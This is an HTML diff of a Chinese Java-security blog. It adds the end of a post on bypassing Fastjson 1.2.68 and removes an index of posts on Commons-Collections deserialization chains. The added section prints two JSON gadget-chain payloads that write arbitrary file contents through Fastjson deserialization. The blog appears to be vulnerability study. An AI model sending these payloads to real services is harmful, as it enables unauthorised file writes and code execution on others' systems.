&#x27;@type&#x27;:&#x27;org.apache.solr.common.util.FastOutputStream&#x27;,</span><br><span class="line">        &#x27;tempBuffer&#x27;:&#x27;SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=&#x27;,</span><br><span class="line">        &#x27;sink&#x27;:</span><br><span class="line">        &#123;</span><br><span class="line">            &#x27;$ref&#x27;:&#x27;$.stream&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;start&#x27;:38</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;close&#x27;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;@type&#x27;:&quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &#x27;@type&#x27;:&#x27;org.iq80.snappy.SnappyOutputStream&#x27;,</span><br><span class="line">        &#x27;out&#x27;:</span><br><span class="line">        &#123;</span><br><span class="line">            &#x27;$ref&#x27;:&#x27;$.writer&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>jdk8&#x2F;10写文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">  &quot;@type&quot;: &quot;sun.rmi.server.MarshalOutputStream&quot;,</span><br><span class="line">  &quot;out&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;java.util.zip.InflaterOutputStream&quot;,</span><br><span class="line">    &quot;out&quot;: &#123;</span><br><span class="line">      &quot;@type&quot;: &quot;java.io.FileOutputStream&quot;,</span><br><span class="line">      &quot;file&quot;: &quot;dst&quot;,</span><br><span class="line">      &quot;append&quot;: &quot;false&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;infl&quot;: &#123;</span><br><span class="line">      &quot;input&quot;: &quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;bufLen&quot;: 1048576</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;protocolVersion&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>更多<code>payload</code>请看<code>safe6sec</code>师傅的文章。</p>
+
+  </div>
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-07-21T23:31:18+08:00">2025-07-21</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-              <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url"><span itemprop="name">JAVA安全</span></a>
-            </span>
-          
-        
-      </div>
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
       
-        <div>
-          <a class='readmore' href='/2025/07/21/CC%E9%93%BE%E6%80%BB%E7%BB%93/' itemprop="url">
-            Read More
-          </a>
-        </div>
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-08-07T23:30:21+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Aug 7, 2025</p>
+  </a>
 </div>
 
-          </div>
         
       
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="https://schema.org.cn/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/07/20/CC链7/">
-  <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
-    <meta itemprop="name" content="n1utra's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="https://schema.org.cn/Post">
-    <meta itemprop="name" content="n1utra's blog">
-    <meta itemprop="description" content="网络安全">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
+    </div>
+    <!-- Custom Files bottomMeta begin -->
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/07/20/CC%E9%93%BE7/"  itemprop="url">
-        浅述CC链(8)：CC链7
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        CC链7CC链7同样是在LazyMap#get的基础上进行了修改，这里找到的调用点找到了AbstractMap#equals这里，然后会被AbstractMapDecorator#equals调用，AbstractMapDecorator#equals又被Hashtable#reconstitutionPut调用。这里涉及到装饰器的设计模式，中间的调用不是之前那种直接查找用法。
-简单来说：
-...
-      
-    
+    <!-- Custom Files bottomMeta end -->
   </div>
+
+
   
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-07-20T19:37:04+08:00">2025-07-20</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-              <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url"><span itemprop="name">JAVA安全</span></a>
-            </span>
-          
-        
-      </div>
+  
+
+  
+    <div class="prev-next">
       
-        <div>
-          <a class='readmore' href='/2025/07/20/CC%E9%93%BE7/' itemprop="url">
-            Read More
-          </a>
-        </div>
+      
+        <a class='next' href='/2025/08/04/FastJson-1-2-47%E5%8F%8A%E4%B9%8B%E5%89%8D%E5%88%A9%E7%94%A8/'>
+          <p class='title'>浅述Fastjson(2)：FastJson 1.2.47及之前利用<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>Fastjson1.2.24利用点分析在前篇中讲述了fastjson的反序列化流程，能看出来与java原生反序列化的不同点
+
+fastjson反序列化的类不需要实现序列化接口
+原生反序列化时属性...</p>
+        </a>
       
     </div>
   
+  <!-- 文章推荐 -->
+  
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
 
-</div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="https://schema.org.cn/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/07/20/CC链5/">
-  <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
-    <meta itemprop="name" content="n1utra's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="https://schema.org.cn/Post">
-    <meta itemprop="name" content="n1utra's blog">
-    <meta itemprop="description" content="网络安全">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/07/20/CC%E9%93%BE5/"  itemprop="url">
-        浅述CC链(7)：CC链5
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        CC链5CC链5就是在CC链1-LazyMap的基础上进行修改。CC链1-LazyMap中LazyMap#get利用的调用点是AnnotationInvocationHandler#invoke。在CC链5中则是换成了TiedMapEntry#toString。也就是说CC链5还是基于commons-collections:3.2.1版本
-所以执行点还是采用CC链1-LazyMap，把后面的...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-07-20T16:04:03+08:00">2025-07-20</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/07/20/CC%E9%93%BE5/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
   
 
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="https://schema.org.cn/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/07/20/CC链2/">
-  <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
-    <meta itemprop="name" content="n1utra's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="https://schema.org.cn/Post">
-    <meta itemprop="name" content="n1utra's blog">
-    <meta itemprop="description" content="网络安全">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/07/20/CC%E9%93%BE2/"  itemprop="url">
-        浅述CC链(6)：CC链2
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        CC链2CC链2只是在CC链4的基础上进行了简单的修改。YSO中CC链4是继续查找TemplatesImpl类的调用，也就是CC链3中的执行点TrAXFilter（虽然我没有这么写）。CC链2就是通过invoke直接去反射创建TemplatesImpl，中间的调用点还是基于优先队列
-所以这里直接把CC链4的的执行点改造一下即可，需要注意的是，改造之后在序列化时也会执行命令，所以这里需要先在代...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-07-20T15:21:11+08:00">2025-07-20</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-              <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url"><span itemprop="name">JAVA安全</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/07/20/CC%E9%93%BE2/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="https://schema.org.cn/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/07/17/CC链4/">
-  <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
-    <meta itemprop="name" content="n1utra's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="https://schema.org.cn/Post">
-    <meta itemprop="name" content="n1utra's blog">
-    <meta itemprop="description" content="网络安全">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/07/17/CC%E9%93%BE4/"  itemprop="url">
-        浅述CC链(5)：CC链4
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        CC链4CC链1、3、6都是组件commons-collections 3.2.1及之前的版本，CC链4则是利用commons-collections 4.0这个版本中的组件。
-在CC链4中TransformingComparator提供了serializeable序列化接口。
-其实和前面三条链没有太大变化，唯一变化的就是中间的调用点部分
-执行点：InvokerTransformer执行点依...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-07-17T21:51:02+08:00">2025-07-17</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-              <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url"><span itemprop="name">JAVA安全</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/07/17/CC%E9%93%BE4/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="https://schema.org.cn/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/07/13/CC链3/">
-  <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
-    <meta itemprop="name" content="n1utra's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="https://schema.org.cn/Post">
-    <meta itemprop="name" content="n1utra's blog">
-    <meta itemprop="description" content="网络安全">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/07/13/CC%E9%93%BE3/"  itemprop="url">
-        浅述CC链(4)：CC链3
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        CC链3CC链3和CC链6以及CC链1的执行点不同，采用的是类动态加载的方式，CC链6和CC链1是命令执行，而CC链3则是代码执行。
-简单来说，CC链1和CC链6都是通过InvokerTransfomer传入执行Runtime类的方法来执行命令
-而CC链3是通过通过InvokerTransfomer传入执行构造出来的类加载器来执行指定的JAVA代码
-相当于给CC1和CC6构造了一个更复杂的执...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-07-13T22:20:21+08:00">2025-07-13</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-              <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url"><span itemprop="name">JAVA安全</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/07/13/CC%E9%93%BE3/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="https://schema.org.cn/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/07/13/URLDNS链/">
-  <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
-    <meta itemprop="name" content="n1utra's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="https://schema.org.cn/Post">
-    <meta itemprop="name" content="n1utra's blog">
-    <meta itemprop="description" content="网络安全">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/07/13/URLDNS%E9%93%BE/"  itemprop="url">
-        URLDNS链
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        URLDNS链URLDNS链是最简单的链，用来了解反序列化链再合适不过，这条链常用来探测是否存在反序列化漏洞
-执行点：URL在URL#hashCode方法中，会调用handler.hashCode对当前对象进行hash计算
-1234567public synchronized int hashCode() &#123;    if (hashCode != -1)        return...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-07-13T20:15:01+08:00">2025-07-13</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-              <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url"><span itemprop="name">JAVA安全</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/07/13/URLDNS%E9%93%BE/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="https://schema.org.cn/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/07/12/CC链6/">
-  <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
-    <meta itemprop="name" content="n1utra's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="https://schema.org.cn/Post">
-    <meta itemprop="name" content="n1utra's blog">
-    <meta itemprop="description" content="网络安全">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/07/12/CC%E9%93%BE6/"  itemprop="url">
-        浅述CC链(3)：CC链6
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        CC链6CC链6是CC链1-LazyMap+URLDNS链的结合：
-URLDNS链中是通过hashMap#readObject方法中，对key进行哈希计算调用了hashCode，当key被赋值为URL类时，调用URL类的hashcode方法会调用到java.net.URLStreamHandler#hashCode，在这个方法里面对传入的域名进行解析，解析时DNSLog就能够获取到对应的数据...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-07-12T15:43:39+08:00">2025-07-12</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-              <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url"><span itemprop="name">JAVA安全</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/07/12/CC%E9%93%BE6/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="https://schema.org.cn/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/07/08/CC链1-LazyMap/">
-  <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
-    <meta itemprop="name" content="n1utra's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="https://schema.org.cn/Post">
-    <meta itemprop="name" content="n1utra's blog">
-    <meta itemprop="description" content="网络安全">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/07/08/CC%E9%93%BE1-LazyMap/"  itemprop="url">
-        浅述CC链(2)：CC链1-LazyMap
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        CC链1-LazyMap这里来说说CC链1的另外一条链：LazyMap。它和TransformedMap链的执行点一样，都是InvokerTransformer，不同的是中间的调用点不同，调用时涉及到动态代理相关知识，需要提前学习了解这块的内容。
-搭建环境
-
-jdk8u65
-Commons-Collections 3.2.1
-
-执行点：InvokerTransformer这里的执行点和Tra...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-07-08T22:36:56+08:00">2025-07-08</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-              <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url"><span itemprop="name">JAVA安全</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/07/08/CC%E9%93%BE1-LazyMap/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="https://schema.org.cn/Article" >
-  <link itemprop="mainEntityOfPage" href="http://example.com/2025/07/06/CC链1-TransformedMap/">
-  <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
-    <meta itemprop="name" content="n1utra's blog">
-  </span>
-  <span hidden itemprop="post" itemscope itemtype="https://schema.org.cn/Post">
-    <meta itemprop="name" content="n1utra's blog">
-    <meta itemprop="description" content="网络安全">
-  </span>
-  
-  
-  
-    <span hidden>
-      <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-    </span>
-  
-  
-    
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/07/06/CC%E9%93%BE1-TransformedMap/"  itemprop="url">
-        浅述CC链(1)：CC链1-TransformedMap
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
-    
-      
-        CC链1-TransformedMap反序列化利用链的大概流程如下图所示，其实就是找到一个可利用点，不停寻找调用点，一直到起点调用，中间的调用点可以不存在，也可以很多
-
-这里先来说说CC链1，CC链1存在两条链，先说TransformedMap这一条
-搭建环境
-
-jdk8u65
-Commons-Collections 3.2.1
-
-执行点：InvokerTransformer在Invoker...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time itemprop="dateCreated datePublished" datetime="2025-07-06T23:26:15+08:00">2025-07-06</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
-          
-            <span hidden itemprop="about" itemscope itemtype="https://schema.org.cn/Thing">
-              <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url"><span itemprop="name">JAVA安全</span></a>
-            </span>
-          
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2025/07/06/CC%E9%93%BE1-TransformedMap/' itemprop="url">
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
   
 
 
-	
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="https://schema.org.cn/WPSideBar">
   
@@ -3201,102 +2738,31 @@ Commons-Collections 3.2.1
     
     
       
-<section class="widget blogger desktop mobile ">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/'>
-          <img no-lazy src='/static/pic/avatar.jpg'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>n1utra</h2>
-        
-        
-          <p>与其感慨路难行，不如马上出发</p>
-
-        
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="https://github.com/n1utra/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget category desktop">
-    
-  <header>
-    
-      <a href='/blog/categories/'><i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/JAVA%E5%AE%89%E5%85%A8/" href="/categories/JAVA%E5%AE%89%E5%85%A8/"
-            active-action="action-categoriesJAVAE5AE89E585A8"
-            ><div class='name'>JAVA安全</div><div class='badge'>(9)</div></a></li>
-        
-      </ul>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget tagcloud desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fa-solid fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/CC%E9%93%BE/" style="font-size: 19px; color: #777">CC链</a> <a href="/tags/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 14px; color: #999">FastJson反序列化</a> <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" style="font-size: 24px; color: #555">JAVA安全</a>
-    </div>
-  </section>
-
-
     
   
 
 
 <div class="widget-sticky">
+
+  
+  
+
+
+<section class="widget toc-wrapper desktop mobile" id="toc-div" >
+  
+  <header>
+    
+      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+  <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-47%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.</span> <span class="toc-text">1.2.47修复</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MiscCodec%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.1.</span> <span class="toc-text">MiscCodec修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TypeUtils%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.2.</span> <span class="toc-text">TypeUtils修复</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-2-68%E5%8F%8A%E4%B9%8B%E5%89%8D%E5%8F%AF%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">1.2.68及之前可利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-59%E7%89%88%E6%9C%AC"><span class="toc-number">2.1.</span> <span class="toc-text">1.2.59版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-61%E7%89%88%E6%9C%AC"><span class="toc-number">2.2.</span> <span class="toc-text">1.2.61版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-62%E7%89%88%E6%9C%AC"><span class="toc-number">2.3.</span> <span class="toc-text">1.2.62版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-62-1-2-66%E7%89%88%E6%9C%AC"><span class="toc-number">2.4.</span> <span class="toc-text">1.2.62-1.2.66版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson"><span class="toc-number">2.5.</span> <span class="toc-text">fastjson &lt;&#x3D;1.2.66</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-67%E7%89%88%E6%9C%AC"><span class="toc-number">2.6.</span> <span class="toc-text">1.2.67版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-68%E6%9C%9F%E6%9C%9B%E7%B1%BB%E7%BB%95%E8%BF%87"><span class="toc-number">2.7.</span> <span class="toc-text">1.2.68期望类绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">2.7.1.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8payload"><span class="toc-number">2.7.2.</span> <span class="toc-text">利用payload</span></a></li></ol></li></ol></li></ol>
+  </div>
+</section>
+
+  
 
 </div>
 
@@ -3304,6 +2770,7 @@ Commons-Collections 3.2.1
   
   <!-- Custom Files side end -->
 </aside>
+
 
 
         </div>
@@ -3698,7 +3165,7 @@ Commons-Collections 3.2.1
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"n1utra's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"网络安全"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"n1utra's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/archives/","name":"Archive"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/archives/2025/","name":"2025年"}},{"@type":"ListItem","position":4,"item":{"@id":"http://example.com/archives/2025/7/","name":"7月"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"n1utra's blog","url":"http://example.com/","keywords":null,"description":"网络安全","author":{"@type":"Person","name":"n1utra","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"网络安全"},"publisher":{"@type":"Organization","name":"n1utra's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required 